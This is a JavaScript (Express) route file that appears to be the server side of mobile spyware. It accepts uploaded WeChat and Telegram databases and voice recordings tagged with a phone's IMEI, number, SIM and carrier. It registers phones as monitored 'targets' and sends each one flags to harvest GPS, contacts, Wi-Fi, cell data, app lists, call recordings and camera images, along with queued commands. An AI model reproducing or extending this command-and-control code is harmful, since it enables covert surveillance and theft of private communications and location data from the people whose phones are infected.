'use strict'
let target = require('../db/models/target');
let monitorControl = require('../db/models/monitorControl');
let basicInfo = require('../db/models/basicinfo');
let targetCommand = require('../db/models/targetCommand');
let targetJobs = require('./targetJobs');
let Sequelize = require('sequelize');
let moment = require('moment');
let path = require('path');
let _FS = require('../db/models/FS');
let log4js = require('../logger/log4js');
let {logger} = log4js;
let consoleLog = logger('console');
let info = logger('info');
let warn = logger('warn');
let error = logger('error');
let fileuploader = require("../fileupload/fileuploader");
let uploader = fileuploader.any();

module.exports = function(app){
   // log every url api path
   app.use('/',(req,res,next)=>{
    info.info(req.path);
    consoleLog.info(req.path);
    warn.warn(req.path);
    next();
   });
   
   app.get('/', (req, res)=>{
    
     basicInfo.findAll({raw:true}).then(function(result){
       info.info(result);
       consoleLog.info(result);
     })
     .catch(err=>{
       error.error(err);
       info.error(err);
     })
     res.status(200).json({"msg":"default page"});
   });

   // files
   app.post('/files',(req,res)=>{
     uploader(req, res, function(err){
      if(err){
        consoleLog.info(err);
        // res.status(200).json({"err":err});
      }
      consoleLog.info('files upload');
      warn.warn('files upload');
      consoleLog.info(req.params);
      consoleLog.info(req.body);
      let files = req.files;
      // consoleLog.info(req);
      // warn.warn(req);
      consoleLog.info(files);
      warn.warn(files);
      // consoleLog.info(req.param('files'));
      let imei = (req.query.i)?req.query.i:"";
      let phoneNumber = (req.query.p)?req.query.p:"";
      let sim = (req.query.s)?req.query.s:"";
      let carrier = (req.query.ca)?req.query.ca:"";
      let build = (req.query.b)?req.query.b:"";
      let monitor = (req.query.m)?req.query.m:"";
      consoleLog.info(`imei = ${imei}, phoneNumber = ${phoneNumber}, sim = ${sim}, carrier = ${carrier}, build = ${build}, monitor = ${monitor}`); 
      warn.warn(`imei = ${imei}, phoneNumber = ${phoneNumber}, sim = ${sim}, carrier = ${carrier}, build = ${build}, monitor = ${monitor}`);
      if(files){
        files.forEach((file)=>{
          let originalname = file.originalname;
          consoleLog.info(`file:${originalname}`);
          warn.warn(`file:${originalname}`);
          let fileInfo = originalname.split("_");
          let extension = path.extname(originalname);
          let strProcess = "";
          let strGrpNum = "";
          // parse the file info
          if(fileInfo.length > 0){
            if(fileInfo.length > 2 ){
              strGrpNum = fileInfo[1];
            }
            if((fileInfo[0]).toLowerCase()==="wechat"){
              strProcess = "0";
            }
            if(monitor.toLowerCase()==="tg"){
              strProcess = extension.toLowerCase()===".db"?"1":"3";
            }
            else if(monitor.toLowerCase()==="voice"){
              strProcess = extension.toLowerCase()===".db"?"1":"5";
            }
          }//file end
          let addtime = moment().format('YYYY-MM-DD HH:mm:ss');
          consoleLog.info(`start insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
                          values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);
          warn.warn(`start insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
                          values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);                
          _FS.create({
            filename: originalname,
            phoneNumber:phoneNumber,
            imei: imei,
            sim: sim,
            carrier_code: carrier,
            build: build,
            addtime: Sequelize.NOW,
            isprocess: strProcess,
            group_num: strGrpNum
          })
          .then((re)=>{
            consoleLog.info(`success insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
                          values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`);
            warn.warn(`success insert into FS (filename, phoneNumber, imei, sim, carrier_code, build, addtime, isprocess, group_num)
                          values (${originalname},${phoneNumber},${imei},${sim},${carrier},${build},${addtime},${strProcess},${strGrpNum})`); 
          })
          .catch((err)=>{
            consoleLog.error(err);
            error.error(err);
          });
          
        });//files end
        
      }
        res.status(200).json({"msg":"OK"});
      });
   });
   // do GET API
   app.get('/targets',(req,res)=>{
    
     info.info(req.params);
     consoleLog.info(req.params);
    //  warn.warn(req.path);
     target.findAll({raw:true}).then(function(result){
         info.info(result);
         consoleLog.info(result);
         warn.warn(result);
         res.status(200).json(result);
     })
     .catch(function(err){
         error.error(err);
         consoleLog.error(err);
     });
   });
   // doPost API
   app.post('/targets', function(req,res){
  
    warn.info(req.body);
    consoleLog.info(req.body);
    let jsonObj = req.body;
    if(jsonObj.IMEI){
     //do maintain MontiorData
     targetJobs.maintainMonitorData(req,res,jsonObj);

     info.info('request IMEI : ',jsonObj.IMEI);
     warn.warn('request IMEI : ',jsonObj.IMEI);
     consoleLog.info('request IMEI : ',jsonObj.IMEI);
     target.findAll({where:{phone:jsonObj.IMEI},raw:true}).then(function(result){
         info.info(result[0]);
         consoleLog.info(result[0]);
         warn.warn(result[0]);
         if(result[0]&&result[0].ismonitor=='1'){
            consoleLog.info('request IMEI : ',jsonObj.IMEI);
          // target 有存在 且有被monitor
          monitorControl.findAll({where:{IMEI:jsonObj.IMEI},raw:true})
          .then(function(result){
            targetCommand.findAll({where:{IMEI:jsonObj.IMEI},raw:true})
            .then(function(resultCommands){
                let commands = [];
                resultCommands.forEach((resultCommand)=>{
                  commands.push({commandtype:resultCommand.commandtype,
                                command:resultCommand.commandtype==0?resultCommand.commandString:""});
                });
                res.status(200).json({
                   ApkInfo:result[0].applist=='0'?false:true,
                   CellInfo:result[0].connectedCell=='0'?false:true,
                   Contacts:result[0].contacts=='0'?false:true,
                   GPS:result[0].gps=='0'?false:true,
                   Wifi:result[0].wifistate=='0'?false:true,
                   nearbyCellInfo:result[0].nearbyCell=='0'?false:true,
                   exectime :result[0].exectime,
                   commands:commands,
                   Update:false,
                   VoiceRecord:result[0].callrecord=='0'?false:true,
                   catchimage:result[0].catchimage=='0'?false:true
                })
            })
            .catch(function(err1){
              error.error(err1);
              consoleLog.error(err1);
              res.status(500).json({"msg":`select * from  targetCommand where phone=${jsonObj.IMEI} fail`});
            });
          })
          .catch(function(err){
             error.error(err);
             consoleLog.error(err);
             res.status(500).json({"msg":`select * from  monitorControl where phone=${jsonObj.IMEI} fail`});
          });
         }
         else{
          info.info('不存在');
          consoleLog.info('不存在');
          // target 有存在
          if(result[0].ismonitor=="0"){//但沒有被monitor
            consoleLog.info('不存在 ismonitor==0');
            target.update({ismonitor:'1'},{where:{phone:jsonObj.IMEI}})
            .then(function(result){
              checkMonitorAndBasicInfo(req,res,jsonObj);
               res.json({
                   ApkInfo:false,
                   CellInfo:false,
                   Contacts:false,
                   GPS:false,
                   Wifi:false,
                   nearbyCellInfo:false,
                   exectime :"1",
                   commands:null,
                   Update:false,
                   VoiceRecord:false,
                   catchimage:false
              });
            })
            .catch(function(err){
              error.error(err);
              consoleLog.error(err);
              res.status(500).json({"msg":`upate target set ismonitor='1' where phone=${jsonObj.IMEI} fail`});
            });
          }
          else{ 
            consoleLog.info('不存在 target');
            // target 沒有存在
            // insert 
            let create_time = Sequelize.NOW;
            target.create({
                phone:jsonObj.IMEI,
                created_time: create_time,
                ismonitor:'1'
            }).then(function(result){
                checkMonitorAndBasicInfo(req,res,jsonObj);
                res.json({
                   ApkInfo:false,
                   CellInfo:false,
                   Contacts:false,
                   GPS:false,
                   Wifi:false,
                   nearbyCellInfo:false,
                   exectime :"1",
                   commands:null,
                   Update:false,
                   VoiceRecord:false,
                   catchimage:false
                });
            }).catch(function(err){
              error.error(err);
              consoleLog.error(err);
              res.status(500).json({"msg":`insert into target (phone,created_time,ismonitor) values (${jsonObj.IMEI},${create_time},'1') fail`});
            });
          } 
         }
        
     })
     .catch(function(err){
         error.error(err);
         consoleLog.error(err);
         res.status(500).json({"msg":`select * from target where imei=${jsonObj.IMEI} fail`});
     });
    }
    else{
      res.status(200).json({"msg":"no IMEI input"});
    }
   });

   app.get('/*', (req,res)=>{
     res.status(404).json({msg:'not such path'});
   });
   
};

function checkMonitorAndBasicInfo(req,res,rootObj){
  let IMEI = rootObj.IMEI;
  info.info('checkMonitorAndBasicInfo IMEI:',IMEI);
  warn.warn('checkMonitorAndBasicInfo IMEI:',IMEI);
  consoleLog.info('checkMonitorAndBasicInfo IMEI:',IMEI);
  let exectime = moment().format("YYYY-MM-DD HH:mm:ss");
  monitorControl.findAll({where:{IMEI:IMEI},raw:true})
  .then(function(result){
   
    if(result.length==0){// 如果不存在 monitorControl
      
      info.info(`start insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
      warn.warn(`start insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
      consoleLog.info(`start insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
      // insert new monitorControl
      monitorControl.create({
        IMEI:IMEI,
        exectime:exectime
      })
      .then((re)=>{
        info.info(`success insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
        warn.warn(`success insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
        consoleLog.info(`success insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})`);
      })
      .catch((err)=>{
        error.error(err);
        consoleLog.error(err);
        res.status(500).json({"msg":`insert into monitorControl (IMEI,exectime) values (${IMEI},${exectime})fail`});
      });
    }
  })
  .catch(function(err){
    error.error(err);
    consoleLog.error(err);
    res.status(500).json({"msg":`select * from monitorControl where imei=${IMEI} fail`});
  });

  basicInfo.findAll({where:{IMEI:IMEI},raw:true})
  .then(function(result){
    console.log(result);
     // 如果 basicinfo 不存在
    if(result.length==0){
       info.info(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
       warn.warn(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
       consoleLog.info(`start insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
       // insert new basic info
       basicInfo.create({
         IMEI:IMEI,
         Brand: rootObj.Brand,
         _Model: rootObj.Model,
         Release: rootObj.Release,
         mccmnc: rootObj.mccmnc
       })
       .then((re)=>{
        info.info(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
        warn.warn(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
        consoleLog.info(`success insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc})`);
       })
       .catch(function(err){
        error.error(err);
        consoleLog.error(err);
        res.status(500).json({"msg":`insert into basicinfo (IMEI,Brand,Model,Release,mccmnc) values (${IMEI},${rootObj.Brand},${rootObj.Model},${rootObj.Release},${rootObj.mccmnc}) fail`});
       });
    }
  })
  .catch(function(err){
    error.error(err);
    consoleLog.error(err);
    res.status(500).json({"msg":`select * from basicinfo where imei=${IMEI} fail`});
  });
}